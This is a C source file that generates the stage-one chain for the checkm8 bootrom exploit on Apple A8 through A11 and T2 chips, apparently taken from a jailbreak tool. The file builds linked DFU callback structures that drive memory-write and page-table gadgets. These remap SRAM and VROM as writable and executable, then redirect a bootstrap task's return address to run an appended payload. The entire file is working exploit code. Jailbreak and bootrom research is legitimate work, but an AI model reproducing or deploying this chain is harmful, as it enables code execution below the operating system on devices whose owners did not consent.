#include <stage1.h>

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#include <payload.h>

#define ARM_16K_TT_L2_SHIFT 25 // page descriptor shift

// https://github.com/palera1n/openra1n/blob/main/checkm8.c#L398-L580
bool generate_stage1(
    void** outbuf,
    size_t* outlen,
    void* payload,
    size_t payload_sz,
    struct DeviceConfiguration *deviceConfig,
    struct PayloadConfiguration *payloadConfig
) {
    bool wnx = false;
    uint64_t write_gadget = 0;
    uint32_t write_val = 0;

    uint64_t base_address = payloadConfig->insecure_memory_base;

    if(deviceConfig->cpid == A9X || deviceConfig->cpid == A10 || deviceConfig->cpid == A10X || deviceConfig->cpid == T2 || deviceConfig->cpid == A11)
    {
        wnx = true;
    }

    size_t presize = wnx == true ? 0x800 : 0xc0;
    void *buf = malloc(presize);

    uint32_t nextOffset = 0;
    unsigned char* nextBuf = NULL;
    dfu_callback_t* cb = (dfu_callback_t*)buf;
    nextBuf = buf;

    uint32_t current_size = 0;
    int count = 0;

    #define PUSH(end, func, arg0, arg1)                                         \
    {                                                                           \
        count++;                                                                \
        current_size = nextOffset + sizeof(dfu_callback_t);                     \
        if(!(current_size > (wnx == true ? 0x800 : 0xc0)))                      \
        {                                                                       \
            cb->callback = payloadConfig->func_gadget;                          \
            if(count%3 == 0)                                                    \
                nextOffset += 0x80;                                             \
            else                                                                \
                nextOffset += 0x20;                                             \
            if(!end)cb->next = base_address + nextOffset;                       \
            uint64_t* ptr = (uint64_t*)(cb);                                    \
            uint32_t* ptr32 = (uint32_t*)(cb);                                  \
            ptr[15] = func;                                                     \
            if(func == payloadConfig->write_prim)                               \
            {                                                                   \
                ptr[14] = (uint64_t)(arg0 - 4);                                 \
                ptr32[5] = (uint32_t)arg1;                                      \
            }                                                                   \
            else if(func == payloadConfig->write_prim2)                         \
            {                                                                   \
                ptr[14] = (uint64_t)arg0;                                       \
                ptr32[5] = (uint32_t)arg1;                                      \
            }                                                                   \
            else if(func == payloadConfig->write_ttbr0)                         \
            {                                                                   \
                ptr[14] = (uint64_t)arg0;                                       \
            }                                                                   \
            else if(func == payloadConfig->arm_clean_invalidate_dcache_line)    \
            {                                                                   \
                ptr[14] = (uint64_t)arg0;                                       \
            }                                                                   \
            nextBuf = (unsigned char*)(buf + nextOffset);                       \
            cb = (dfu_callback_t*)nextBuf;                                      \
        }                                                                       \
        else                                                                    \
        {                                                                       \
            goto fail;                                                          \
        }                                                                       \
    }                                                                           \

    if((deviceConfig->cpid == A11) || (deviceConfig->cpid == T2) || (deviceConfig->cpid == A8X) || (deviceConfig->cpid == A8))
    {
        write_gadget = payloadConfig->write_prim;
    }
    else
    {
        write_gadget = payloadConfig->write_prim2;
    }

    uint64_t vrom_address = 0x100000000;
    uint64_t sram_address = 0x180000000;
    uint64_t new_va       = 0x142000000; // post-exploit
    uint32_t vrom_off     = (vrom_address >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t new_off      = (new_va       >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t sram_off     = (sram_address >> ARM_16K_TT_L2_SHIFT) * 8;

    uint64_t sram_rx_va  = 0x140000000; // execute payload
    uint64_t sram_rw_va  = 0x142000000; // custom ttbr
    uint32_t sram_rx_off = (sram_rx_va >> ARM_16K_TT_L2_SHIFT) * 8;
    uint32_t sram_rw_off = (sram_rw_va >> ARM_16K_TT_L2_SHIFT) * 8;

    uint64_t vrom_rw_va  = 0x144000000;
    uint32_t vrom_rw_off = (vrom_rw_va >> ARM_16K_TT_L2_SHIFT) * 8;

    if(wnx) // only A9X-A11
    {
        // VROM: 0x100000000
        uint64_t vrom_bit = vrom_address | 0x6a5;
        uint32_t vrom_bit_lower = (uint32_t)(vrom_bit & 0xffffffff);
        uint32_t vrom_bit_upper = (uint32_t)(vrom_bit >> 32);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (vrom_off + 0), vrom_bit_lower);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (vrom_off + 4), vrom_bit_upper);

        // Newp: 0x142000000
        uint64_t new_bit = sram_address | 0x621; // pa
        new_bit |= (deviceConfig->cpid != A9X ? (1uL << 2) : (2uL << 2));
        new_bit |= (1uL << 53); // PXN
        new_bit |= (1uL << 54); // XN
        uint32_t new_bit_lower  = (uint32_t)(new_bit & 0xffffffff);
        uint32_t new_bit_upper  = (uint32_t)(new_bit >> 32);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (new_off + 0), new_bit_lower);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (new_off + 4), new_bit_upper);

        // Newp: 0x144000000
        uint64_t new_bit_2 = sram_address | 0x621; // pa
        new_bit_2 |= (deviceConfig->cpid != A9X ? (1uL << 2) : (2uL << 2));
        new_bit_2 |= (1uL << 53); // PXN
        new_bit_2 |= (1uL << 54); // XN
        uint32_t new_bit_lower_2  = (uint32_t)(new_bit_2 & 0xffffffff);
        uint32_t new_bit_upper_2  = (uint32_t)(new_bit_2 >> 32);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (vrom_rw_off + 0), new_bit_lower_2);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (vrom_rw_off + 4), new_bit_upper_2);

        // SRAM: 0x180000000
        uint64_t sram_bit = sram_address | 0x3;
        sram_bit |= (1uL << 63); // NS
        if(deviceConfig->cpid == A11) sram_bit |= 0x10000;
        if(deviceConfig->cpid == T2) sram_bit |= 0x10000;
        if(deviceConfig->cpid == A10X) sram_bit |= 0xa4000;
        if(deviceConfig->cpid == A10) sram_bit |= 0xa4000;
        if(deviceConfig->cpid == A9X) sram_bit |= 0x54000;
        uint32_t sram_bit_lower = (uint32_t)(sram_bit & 0xffffffff);
        uint32_t sram_bit_upper = (uint32_t)(sram_bit >> 32);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (sram_off + 0), sram_bit_lower);
        PUSH(0, write_gadget, payloadConfig->TTBR0_PATCH_BASE + (sram_off + 4), sram_bit_upper);
    }

    if(wnx)
    {
        write_val = (uint32_t)(((base_address & 0x01FFFFFF) | (sram_rx_va & 0xffffffff)) + payloadConfig->payload_start_offset);
    }
    else
    {
        write_val = (uint32_t)((base_address & 0xFFFFFFFF) + payloadConfig->payload_start_offset);
    }
    PUSH(0, write_gadget, payloadConfig->bootstrap_task_lr, write_val);

    if(wnx) // only A9X-A11
    {
        PUSH(0, payloadConfig->arm_clean_invalidate_dcache_line, payloadConfig->TTBR0_PATCH_BASE + (vrom_off & ~0xff), 0);
        PUSH(0, payloadConfig->arm_clean_invalidate_dcache_line, payloadConfig->TTBR0_PATCH_BASE + (new_off  & ~0xff), 0);
        PUSH(0, payloadConfig->arm_clean_invalidate_dcache_line, payloadConfig->TTBR0_PATCH_BASE + (sram_off & ~0xff), 0);
    }
    PUSH(0, payloadConfig->arm_clean_invalidate_dcache_line, base_address + payloadConfig->payload_start_offset, 0);
    PUSH(wnx == true ? 0 : 1, payloadConfig->arm_invalidate_icache, 0, 0);

    if(wnx) // only A9X-A11
    {
        uint64_t sram_rx_bit = sram_address | 0x6a5;
        uint32_t sram_rx_bit_lower = (uint32_t)(sram_rx_bit & 0xffffffff);
        uint32_t sram_rx_bit_upper = (uint32_t)(sram_rx_bit >> 32);

        uint64_t sram_rw_bit = sram_address | 0x621;
        sram_rw_bit |= (deviceConfig->cpid != A9X ? (1uL << 2) : (2uL << 2));
        sram_rw_bit |= (1uL << 53); // PXN
        sram_rw_bit |= (1uL << 54); // XN
        uint32_t sram_rw_bit_lower = (uint32_t)(sram_rw_bit & 0xffffffff);
        uint32_t sram_rw_bit_upper = (uint32_t)(sram_rw_bit >> 32);

        uint64_t vrom_rw_bit = vrom_address | 0x621;
        vrom_rw_bit |= (deviceConfig->cpid != A9X ? (1uL << 2) : (2uL << 2));
        vrom_rw_bit |= (1uL << 53); // PXN
        vrom_rw_bit |= (1uL << 54); // XN
        uint32_t vrom_rw_bit_lower = (uint32_t)(vrom_rw_bit & 0xffffffff);
        uint32_t vrom_rw_bit_upper = (uint32_t)(vrom_rw_bit >> 32);

        PUSH(0, payloadConfig->enter_critical_section, 0, 0);
        PUSH(0, payloadConfig->write_ttbr0, payloadConfig->TTBR0_PATCH_BASE, 0);
        PUSH(0, payloadConfig->tlbi, 0, 0);

        PUSH(0, write_gadget, vrom_rw_va + payloadConfig->TTBR0_BASE + (vrom_rw_off + 0), vrom_rw_bit_lower);
        PUSH(0, write_gadget, vrom_rw_va + payloadConfig->TTBR0_BASE + (vrom_rw_off + 4), vrom_rw_bit_upper);

        PUSH(0, write_gadget, sram_rw_va + payloadConfig->TTBR0_BASE + (sram_rx_off + 0), sram_rx_bit_lower);
        PUSH(0, write_gadget, sram_rw_va + payloadConfig->TTBR0_BASE + (sram_rx_off + 4), sram_rx_bit_upper);

        PUSH(0, write_gadget, sram_rw_va + payloadConfig->TTBR0_BASE + (sram_rw_off + 0), sram_rw_bit_lower);
        PUSH(0, write_gadget, sram_rw_va + payloadConfig->TTBR0_BASE + (sram_rw_off + 4), sram_rw_bit_upper);

        PUSH(0, payloadConfig->arm_clean_invalidate_dcache_line, vrom_rw_va + payloadConfig->TTBR0_BASE + (vrom_rw_off & ~0xff), 0);
        PUSH(0, payloadConfig->arm_clean_invalidate_dcache_line, sram_rw_va + payloadConfig->TTBR0_BASE + (sram_rx_off & ~0xff), 0);
        PUSH(0, payloadConfig->write_ttbr0, sram_address + payloadConfig->TTBR0_BASE, 0);
        PUSH(0, payloadConfig->tlbi, 0, 0);
        PUSH(1, payloadConfig->exit_critical_section, 0, 0);
    }

    *outlen = payload_sz + (wnx == true ? 0x800 : 0xc0);
    *outbuf = malloc(*outlen);

    memset(*outbuf, 0x0, *outlen);
    memcpy(*outbuf, buf, wnx == true ? 0x800 : 0xc0);
    memcpy(*outbuf + (wnx == true ? 0x800 : 0xc0), payload, payload_sz);
    if(buf) free(buf);
    return true;

fail:
    if(buf) free(buf);
    return false;
}
